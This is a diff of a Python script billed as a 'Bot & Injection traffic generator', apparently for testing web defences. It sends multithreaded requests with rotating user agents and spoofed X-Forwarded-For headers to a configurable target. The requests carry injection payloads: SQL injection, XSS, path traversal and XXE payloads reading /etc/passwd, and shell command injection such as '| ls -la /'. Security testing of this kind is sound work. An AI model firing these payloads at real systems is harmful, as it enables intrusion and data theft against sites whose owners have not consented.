@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 import argparse
+import logging
 import os
 import random
 import requests
@@ -8,15 +9,13 @@ import time
 from concurrent.futures import ThreadPoolExecutor
 from urllib.parse import quote
 
-# -------------------------
-# CONFIGURATION
-# -------------------------
+from common import COMMON_PAYLOADS
+
 TARGET_URL = "https://yourtargetdomain.com"
 THREADS = 10
 REQUESTS_PER_THREAD = 100
 DELAY_BETWEEN_REQUESTS = 0.5  # seconds
 VERIFY_TLS = True
-LOG_FILE = None
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
@@ -24,45 +23,27 @@ USER_AGENTS = [
     "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
     "curl/7.68.0",
     "python-requests/2.27.1",
-    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
+    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
 ]
 
-# -------------------------
-# ADVANCED PAYLOADS
-# -------------------------
-PAYLOADS = [
-    # SQL Injection
-    "' OR '1'='1 --",
-    "1; DROP TABLE users --",
-    "' UNION SELECT null, username, password FROM users --",
+PAYLOADS = COMMON_PAYLOADS + [
     "' OR 'a'='a' /*",
-    # Encoded SQLi
-    quote("' OR '1'='1"),  # URL encoded
-    # XSS
-    "<script>alert('xss')</script>",
-    "<img src=x onerror=alert(1)>",
+    quote("' OR '1'='1"),  # URL encoded SQLi
     "<svg/onload=alert`XSS`>",
     "%3Cscript%3Ealert('encoded')%3C/script%3E",  # Encoded XSS
-    # LFI / Path Traversal
-    "../../../../etc/passwd",
-    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",  # URL encoded
-    # Command Injection
-    "; cat /etc/passwd",
+    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",  # URL encoded path traversal
     "| ls -la /",
     "|| ping -c 1 127.0.0.1",
-    # RCE
-    "`whoami`",
-    "$(id)",
     "${7*7}",
-    # XXE
-    "<?xml version='1.0'?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"
+    "<?xml version='1.0'?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
 ]
 
-# -------------------------
-# HELPER FUNCTIONS
-# -------------------------
+logger = logging.getLogger("bot_test")
+
+
 def random_string(length=8):
-    return ''.join(random.choice(string.ascii_letters) for _ in range(length))
+    return "".join(random.choice(string.ascii_letters) for _ in range(length))
+
 
 def build_url():
     path = "/" + random_string(random.randint(5, 15))
@@ -73,31 +54,31 @@ def build_url():
     query = "&".join([f"{k}={v}" for k, v in params.items()])
     return f"{TARGET_URL}{path}?{query}"
 
-def send_request():
+
+def send_request(session):
     url = build_url()
     headers = {
         "User-Agent": random.choice(USER_AGENTS),
-        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
+        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
     }
     try:
-        r = requests.get(url, headers=headers, timeout=5, verify=VERIFY_TLS)
+        r = session.get(url, headers=headers, timeout=5, verify=VERIFY_TLS)
         line = f"[{r.status_code}] {url} ({headers['User-Agent']})"
     except requests.RequestException as e:
         line = f"[ERROR] {e}"
-    print(line)
-    if LOG_FILE:
-        LOG_FILE.write(line + "\n")
-        LOG_FILE.flush()
+    logger.info(line)
+
 
 def worker():
+    session = requests.Session()
     for _ in range(REQUESTS_PER_THREAD):
-        send_request()
+        send_request(session)
         time.sleep(DELAY_BETWEEN_REQUESTS)
 
-# -------------------------
-# MAIN
-# -------------------------
-if __name__ == "__main__":
+
+def main():
+    global TARGET_URL, THREADS, REQUESTS_PER_THREAD, DELAY_BETWEEN_REQUESTS, VERIFY_TLS
+
     parser = argparse.ArgumentParser(description="Bot & Injection traffic generator")
     parser.add_argument("--target", default=TARGET_URL)
     parser.add_argument("--threads", type=int, default=THREADS)
@@ -113,14 +94,21 @@ if __name__ == "__main__":
     DELAY_BETWEEN_REQUESTS = args.delay
     VERIFY_TLS = not args.insecure_tls
 
+    logger.setLevel(logging.INFO)
+    logger.handlers.clear()
+    handler = logging.StreamHandler()
+    handler.setFormatter(logging.Formatter("%(message)s"))
+    logger.addHandler(handler)
     if args.logdir:
         os.makedirs(args.logdir, exist_ok=True)
-        LOG_FILE = open(os.path.join(args.logdir, "bot_test.log"), "a")
+        fh = logging.FileHandler(os.path.join(args.logdir, "bot_test.log"), encoding="utf-8")
+        fh.setFormatter(logging.Formatter("%(message)s"))
+        logger.addHandler(fh)
 
-    try:
-        with ThreadPoolExecutor(max_workers=THREADS) as executor:
-            for _ in range(THREADS):
-                executor.submit(worker)
-    finally:
-        if LOG_FILE:
-            LOG_FILE.close()
+    with ThreadPoolExecutor(max_workers=THREADS) as executor:
+        for _ in range(THREADS):
+            executor.submit(worker)
+
+
+if __name__ == "__main__":
+    main()
